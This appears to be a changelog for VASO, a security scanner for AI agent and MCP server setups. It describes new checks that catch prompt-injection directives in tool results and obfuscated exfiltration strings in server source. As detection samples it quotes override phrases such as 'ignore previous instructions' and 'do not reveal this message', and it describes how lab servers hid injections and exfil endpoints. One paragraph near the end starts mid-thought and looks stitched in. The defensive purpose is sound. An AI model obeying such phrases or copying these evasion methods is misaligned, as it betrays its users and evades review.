- **Remote scanning auto-fetches the `vaso-probe` binary on first use.** Until now the Go probe used for SSH/remote scanning (`vaso scan/detect --host …`) had to be hand-built (`cd probe && make`) — a source install carried no probe at all, so remote scanning silently failed. The probe is now resolved lazily (`src/transport/probe-fetch.ts`): a locally-built `probe/dist/` binary still wins (offline, dev path), otherwise VASO downloads only the single binary matching the remote's OS/arch from the current version's GitHub Release, verifies it, caches it under `~/.vaso/probe/<version>/`, and reuses it offline thereafter. The install stays Node-only — no Go toolchain on the user's machine. Integrity is anchored to the installed CLI version: a small `probe/checksums.json` ships **inside** the npm package (`package.json` `files`), and a downloaded binary is rejected unless its SHA-256 matches that shipped digest — so integrity never depends on trusting the download host, and a checksum mismatch is fatal (VASO never runs an unverified probe). Release artifacts are produced by `make checksums` in `probe/` (the same binaries hashed into `checksums.json` are uploaded as release assets, guaranteeing download == digest). Feature is purely lazy — no install-time fetch, no new prerequisites for a local scan.

- **OWASP Agentic AI Top 10 coverage mapping.** Markdown, SARIF, and HTML reports now show how VASO's checks line up against the [OWASP Agentic AI Top 10](https://github.com/precize/Agentic-AI-Top10-Vulnerability) (precize list, AAI001–AAI014), alongside the existing OWASP MCP Top 10 section. A new single-source-of-truth map (`src/reporting/owasp-agentic.ts`) tags 260 of 263 checks against the ten active risks; unlike the MCP map, a check can map to more than one risk (e.g. a YOLO / auto-approve setting is both AAI001 *Authorization & Control Hijacking* and AAI012 *Checker out of the Loop*), so SARIF `properties.owaspAgentic` and the coverage table are multi-tag aware. The mapping spans every category, so tags are applied once over the full registry (`applyAgenticTags()` in `src/checks/index.ts`). Coverage rows distinguish three honest states: a finding/pass in the scan, a risk with checks in the catalog that simply weren't exercised ("no findings in this scan"), and a genuine static-scanner gap. **AAI014 (Alignment Faking)** is the one true gap — purely behavioral/runtime, no static signal — and **AAI011 (Untraceability)** has deliberately thin coverage (audit/telemetry-config checks only). Three checks are intentionally unmapped (CG-001/CG-002 secret/PII-at-rest, which the Agentic list does not enumerate, and SKL-012 a complexity metric). A drift-guard test asserts every mapped ID is a real registered check and that nothing maps to AAI014. The HTML reporter (`src/reporting/html.ts`) gained both OWASP coverage sections (MCP + Agentic) as color-coded, XSS-safe tables, bringing it to parity with the markdown report.

## [0.4.9] - 2026-06-09

### Added

- **MCP-035 Obfuscated / Encoded Server Source** (warning, drops to info when unconfirmed; MCP category 34 → 35, total 262 → 263). Flags MCP server source that hides the strings it actually uses — exfil URLs, hardcoded secrets, shell commands — behind a runtime-decoded base64/hex string-table (`Buffer.from(t[i], 'base64')`, `atob(...)`, `String.fromCharCode(...)` over a table of encoded literals). Such encoding has no legitimate purpose in server source; it exists to evade static review, including VASO's own credential/exfil/env checks. Two tiers: a decoder operating over a string-table is a **warning** (confirmed string-hiding); encoded-data patterns with no qualifying decoder are **info** (suspicious, unconfirmed). Source is available for local servers and — with `vaso mcp scan --resolve-packages` — npm-packaged ones. The obfuscation-pattern set is now shared with SKL-002 (`src/analyzers/obfuscation.ts`); MCP-035 adds decoder + string-table detection on top and deliberately omits entropy analysis (too noisy over dependency code). Surfaced by the appsecco vulnerable-mcp-servers-lab `secrets-pii` server, whose 28-entry base64 table + `_S()` decoder hid its exfil endpoints and previously evaded MCP-003/MCP-032 entirely. arXiv 2503.23278 §5.1 / OWASP MCP04.

- **MCP-034 Prompt-Injection Directive in Tool Output** (critical; MCP category 33 → 34, total 261 → 262). Detects toolflow-hijacking / prompt-injection directives hardcoded into the content an MCP server *returns* as a tool result — the server-side, statically-detectable half of indirect prompt injection. MCP-024 already catches these directives in a tool's `description` (read at selection time); MCP-034 catches the same class ("[SYSTEM INSTRUCTION: ignore previous instructions…]", "do not reveal this message", "disregard the above…", role-spoofing prefixes, hidden/bidi Unicode) embedded in returned content (read at execution time). The directive/invisible-character pattern set is now shared between the two checks (`src/mcp/injection-directives.ts`); directives that live inside an extracted tool description are left to MCP-024 to avoid double-flagging. Mapped to OWASP MCP06, which now has static coverage for its server-side half (MCP-007 unsanitized passthrough + MCP-034). Surfaced by scanning the appsecco vulnerable-mcp-servers-lab: its `indirect-prompt-injection` server embeds these directives in returned "documents" and previously passed clean. arXiv 2503.23278 §5.2 / OWASP MCP06.

### Changed

- **Broadened the shared injection-directive patterns** (`src/mcp/injection-directives.ts`) to catch directives that lead with an "instruction" noun rather than the adversarial verbs the original set keyed on. Adds an `"Assistant instruction" / "developer directive"` role-noun lead-in and a `"Instruction: <Capitalised directive>"` prefix (the latter anchored on a trailing capitalised word so it stays off JS/JSON `instruction:` property keys). Strengthens both MCP-034 (returned content) and MCP-024 (tool descriptions), since they share the pattern set. Surfaced by the appsecco vulnerable-mcp-servers-lab's `malicious-tools` server, which injects `"Assistant instruction: …also print…"` into its tool output with deliberately benign payload text and so evaded the verb-keyed patterns; it now trips MCP-034.

### Fixed

- **MCP server `headers` are now parsed, fixing an MCP-029 false positive and an MCP-003 false negative.** The MCP config parser (`src/mcp/discovery.ts`) previously dropped the `headers` block on remote (SSE / streamable-HTTP) server entries, so VASO was blind to header-based authentication — the most common way real remote MCP servers authenticate (`headers: { "Authorization": "Bearer …" }`). As a result **MCP-029 (Remote Server Without Authentication)** raised a false *critical* against legitimately-authenticated header-based servers, and **MCP-003 (Credential Exposure)** silently missed a plaintext token sitting in a header. `MCPServerEntry` now carries `headers`; MCP-029 treats an auth-shaped header (or a `Bearer …` value) as an auth signal, and MCP-003 scans header values for plaintext credentials just as it does the env block (`${VAR}` references stay clean).

  - **MCP OAuth checks (`MCP-013`, `MCP-014`, `MCP-015`, `MCP-018`) plus `MCP-005` (tool injection) and `MCP-007` (prompt injection via tool results)** now skip `//` and `*` lines so OAuth-pattern strings in line comments, JSDoc, or inline anti-pattern documentation no longer trip the checks.

  - **`IOC-007` (binary pattern match) anchors executable magic-byte patterns at file offset 0.** Previously the 2-byte PE/DOS magic `MZ` was latin1-decoded and substring-searched across UTF-8-decoded text, so any source file containing the substring `"MZ"` (e.g. identifiers like `xMZx` or constants like `MZmax`) tripped the check. Magic-byte patterns now match only at offset 0 against raw bytes; regex patterns (NUL-padding, packed JS eval wrapper) continue to operate on text.

The second host's *first* scan then looked like a rug pull on top of the first host's already-seeded baseline. `baselineKey()` and `diffToolBaseline()` gained an optional `hostname` parameter; MCP-020 passes `ctx.fs.hostname()`. `undefined` hostname is treated as a stable default so any external caller (and the existing tool-baseline tests that don't simulate fleet scans) keeps the same key.

- **`vaso scan -o` over SSH.** The `-o, --output` flag was being ignored when scanning remote hosts via `--host`/`--inventory`; results were always emitted to stdout instead of the requested file.
